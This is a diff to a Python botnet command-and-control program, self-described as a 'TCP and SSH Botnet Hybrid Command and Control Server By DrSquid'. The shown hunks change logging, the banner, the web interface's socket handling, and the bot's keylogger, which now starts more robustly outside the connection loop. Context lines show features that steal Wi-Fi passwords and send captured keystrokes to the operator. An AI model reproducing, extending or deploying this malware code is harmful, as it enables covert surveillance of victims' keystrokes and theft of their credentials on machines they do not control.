@@ -203,7 +203,7 @@ class Botnet:
         except Exception as e:
             self.logo()
             print("[+] The Server cannot be started! Check the logs for more info.")
-            self.log(f"[(ERROR)]: Unable to bind IP and Port due to: {e}")
+            self.log(f"\n[(ERROR)]: Unable to bind IP and Port due to: {e}")
             sys.exit()
         self.adminconfig = threading.Thread(target=self.configure_adminfile)
         self.adminconfig.start()
@@ -279,14 +279,14 @@ class Botnet:
     def log_logo(self):
         """Logo of this script."""
         logo = """
-  _____             _     _ _   _      _         ______ __ 
- / ____|           (_)   | | \ | |    | |       |____  /_ |
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __ / / | |
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / // /  | |
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V // /   | |
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_//_(_)  |_|
-           | |                                             
-           |_|                                                                                                                                                       
+  _____             _     _ _   _      _         ______ __ _____ 
+ / ____|           (_)   | | \ | |    | |       |____  /_ | ____|
+| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __ / / | | |__  
+ \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / // /  | |___ \ 
+ ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V // /   | |___) |
+|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_//_(_)  |_|____/ 
+           | |                                                   
+           |_|                                                                                                                                                      
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         return logo
     def logo(self):
@@ -569,7 +569,6 @@ ________________________________________________________
                                 main_msg = main_msg + " " + i
                             main_msg = main_msg.strip()
                             logthis = f"[({hostname})]: {main_msg}"
-                            self.log(logthis)
                             if self.displaykeys:
                                 print(logthis)
                     if admin:
@@ -4581,8 +4580,11 @@ class Bot:
     def on_release(self, key):
         pass
     def start_logging(self):
-        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
-            listener.join()
+        try:
+            with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+                listener.join()
+        except:
+            pass
     def obtainwifipass(self):
         if sys.platform == "darwin":
             self.send("This bot is on a Apple-based product. Unable to get wifi passwords!")
@@ -4754,12 +4756,12 @@ OS:       {sys.platform}
                         self.send("!CLIENTLOG".encode())
                         time.sleep(1)
                         connected = True
-                        try:
-                            logger = threading.Thread(target=self.start_logging)
-                            logger.start()
-                        except:
-                            pass
                         break
+                    except:
+                        pass
+                    try:
+                        logger = threading.Thread(target=self.start_logging)
+                        logger.start()
                     except:
                         pass
 
@@ -5221,6 +5223,10 @@ class Web_Interface:
         conn.send('Content-Type: text/html\n'.encode())
         conn.send('\n'.encode())
         conn.send(self.packet.encode())
+        if sys.platform == "win32":
+            pass
+        else:
+            conn.close()
 """Clears CMD Output."""
 if sys.platform == "win32":
     os.system("cls")
